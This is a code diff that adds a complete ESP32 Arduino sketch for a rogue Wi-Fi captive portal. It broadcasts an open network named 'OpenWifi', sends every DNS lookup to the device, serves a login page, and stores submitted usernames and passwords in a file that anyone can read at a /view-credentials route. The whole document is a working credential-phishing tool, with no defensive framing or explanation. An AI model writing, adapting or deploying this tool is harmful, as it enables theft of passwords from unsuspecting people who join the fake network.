@@ -1,0 +1,143 @@
+#include <DNSServer.h>
+#include <WiFi.h>
+#include <AsyncTCP.h>
+#include "ESPAsyncWebServer.h"
+#include <SPIFFS.h>
+#include <ArduinoJson.h> // Include ArduinoJson library for JSON parsing
+
+DNSServer dnsServer;
+AsyncWebServer server(80);
+
+bool name_received = false;
+bool password_received = false;
+
+// Define CaptiveRequestHandler class
+class CaptiveRequestHandler : public AsyncWebHandler {
+public:
+  CaptiveRequestHandler() {}
+  virtual ~CaptiveRequestHandler() {}
+
+  bool canHandle(AsyncWebServerRequest *request){
+    return true;
+  }
+
+  void handleRequest(AsyncWebServerRequest *request) {
+    request->send(SPIFFS, "/index.html", "text/html");
+  }
+};
+
+// Function to save credentials to SPIFFS
+void saveCredentials(String username, String pass) {
+  // Open file in read mode to read existing content
+  File file = SPIFFS.open("/credentials.txt", "r");
+  if (!file) {
+    Serial.println("Failed to open file for reading");
+    return;
+  }
+
+  // Read existing content
+  String existingContent = "";
+  while (file.available()) {
+    existingContent += (char)file.read();
+  }
+  file.close();
+
+  // Construct JSON object for the new credentials
+  StaticJsonDocument<100> doc;
+  doc["Username"] = username;
+  doc["Password"] = pass;
+
+  // Serialize JSON object to a String
+  String newEntry;
+  serializeJson(doc, newEntry);
+
+  // Prepend new entry to existing content
+  String updatedContent = newEntry + "\n" + existingContent;
+
+  // Open file in write mode to overwrite with updated content
+  file = SPIFFS.open("/credentials.txt", "w");
+  if (!file) {
+    Serial.println("Failed to open file for writing");
+    return;
+  }
+
+  // Write updated content to the file
+  file.print(updatedContent);
+  file.close();
+}
+
+// Function to handle root requests
+void handleRoot(AsyncWebServerRequest *request) {
+  request->send(SPIFFS, "/index.html", "text/html");
+}
+
+// Function to handle credential submission
+void handleCredentials(AsyncWebServerRequest *request) {
+  String username;
+  String password;
+  
+  if (request->hasParam("name")) {
+    username = request->getParam("name")->value();
+    name_received = true;
+  }
+
+  if (request->hasParam("password")) {
+    password = request->getParam("password")->value();
+    password_received = true;
+  }
+
+  if (name_received && password_received) {
+    saveCredentials(username, password);
+    request->send(SPIFFS, "/index.html", "text/html"); // Send index.html again
+  } else {
+    request->send(400, "text/html", "Missing username or password.");
+  }
+}
+
+void setupServer(){
+  server.on("/", HTTP_GET, handleRoot);
+  server.on("/get", HTTP_GET, handleCredentials);
+
+  // Route to view credentials
+  server.on("/view-credentials", HTTP_GET, [](AsyncWebServerRequest *request){
+      File file = SPIFFS.open("/credentials.txt", "r");
+      if (!file) {
+        request->send(404);
+        return;
+      }
+
+      String credentials = "";
+      while (file.available()) {
+        credentials += (char)file.read();
+      }
+      file.close();
+      
+      request->send(200, "text/plain", credentials);
+  });
+}
+
+void setup() {
+  Serial.begin(115200);
+  
+  // Initialize SPIFFS
+  if (!SPIFFS.begin(true)) {
+    Serial.println("An error occurred while mounting SPIFFS");
+    return;
+  }
+  
+  // Set up WiFi AP
+  WiFi.mode(WIFI_AP); 
+  WiFi.softAP("OpenWifi");
+  
+  // Start DNS server
+  dnsServer.start(53, "*", WiFi.softAPIP());
+  
+  // Set up AsyncWebServer
+  setupServer();
+  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
+  server.begin();
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+}
